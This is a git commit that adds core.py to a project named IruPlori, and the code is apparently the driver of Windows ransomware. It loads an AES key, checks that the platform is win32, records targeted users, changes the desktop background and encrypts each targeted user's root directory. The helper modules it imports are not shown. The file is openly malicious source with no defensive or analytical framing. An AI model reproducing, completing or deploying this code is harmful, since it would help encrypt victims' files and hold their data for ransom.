a25f651475f334951ce4c27bd7cf9d92fa434a2a
tecnobert <mrrabbitomg@gmail.com>
2020-04-13 16:39:21 -0300

    win32 fixed

---
+++ core.py
@@ -0,0 +1,23 @@
+from lib import background
+from lib import aes
+from lib import files
+import json
+import sys
+
+KEY = json.load(open('data/key.json'))
+
+crypter = aes.AES(KEY)
+
+if __name__ == "__main__":
+    # If the operating system is not windows; exit.
+    if sys.platform != 'win32':
+        sys.exit('ERROR: IruPlori only supports windows.')
+
+    # Write the users that failed and succeeded and change the background.
+    files.write_users()
+
+    background.changeBG(background.get_background())
+
+    # Encryption progress.
+    for user in files.get_targeted_users():
+        crypter.encrypt_root(user)
